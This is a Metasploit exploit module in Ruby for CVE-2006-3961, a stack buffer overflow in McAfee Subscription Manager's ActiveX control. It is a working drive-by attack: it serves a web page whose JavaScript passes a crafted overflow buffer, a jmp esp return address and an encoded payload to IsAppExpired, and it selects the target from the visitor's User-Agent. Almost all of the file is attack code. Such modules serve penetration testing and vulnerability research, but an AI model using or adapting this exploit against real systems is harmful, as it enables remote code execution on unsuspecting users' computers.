##
# $Id: mcafee_mcsubmgr_vsprintf.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'McAfee Subscription Manager Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a flaw in the McAfee Subscription Manager ActiveX control.
				Due to an unsafe use of vsprintf, it is possible to trigger a stack buffer overflow by
				passing a large string to one of the COM-exposed routines, such as IsAppExpired.
				This vulnerability was discovered by Karl Lynn of eEye.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'skape',
				],
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '2006-3961'],
					[ 'OSVDB', '27698'],
					[ 'BID', '19265'],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2006-August/048565.html'],
				],
			'Payload'        =>
				{
					'Space'          => 1014,
					'MaxNops'        => 0,
					'BadChars'       => "\x00\x09\x0a\x0d'\\" + Rex::Text::UpperAlpha + Rex::Text::HighAscii,
					'EncoderType'    => Msf::Encoder::Type::NonUpperUtf8Safe,
					'EncoderOptions' =>
						{
							'BufferOffset' => 0x8
						}
				},
			'Targets'        =>
				[
					# Target 0: Automatic
					[
						'Windows XP SP0/SP1',
						{
							'Platform' => 'win',
							'Rets'     =>
								[
									0x7605122f, # XP SP0/SP1 shell32.dll: jmp esp
									#0x773f346a  # XP SP2 comctl32.dll: jmp esp
								]
						},
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 01 2006'))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Pick the right target
		case request['User-Agent']
			when /Windows NT 5.1/
				ret = target['Rets'][0]
			else
				print_error("Unsupported target: #{request['User-Agent']}")
				cli.send_response(create_response(404, 'File not found'))
				return
		end

		# Build out our overflow buffer
		buf =
			rand_text(2972, payload_badchars) +
			[ ret ].pack('V') +
			"\x60" + # pusha
			"\x6a" + rand_char + # push byte 0x1
			"\x6a" + rand_char + # push byte 0x1
			"\x6a" + rand_char + # push byte 0x1
			"\x61" + # popa
			p.encoded

		# Generate random variable names
		vname    = rand_text_alpha(rand(100) + 1)
		strname  = rand_text_alpha(rand(100) + 1)

		# Build out the message
		content =
			"<html>" +
			"<object classid='clsid:9BE8D7B2-329C-442A-A4AC-ABA9D7572602' id='#{vname}'></object>" +
			"<script language='javascript'>\n" +
			"var #{vname} = document.getElementById('#{vname}');\n" +
			"var #{strname} = new String('#{buf}');\n" +
			"#{vname}.IsAppExpired(#{strname}, #{strname}, #{strname});\n" +
			"</script>" +
			"</html>"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
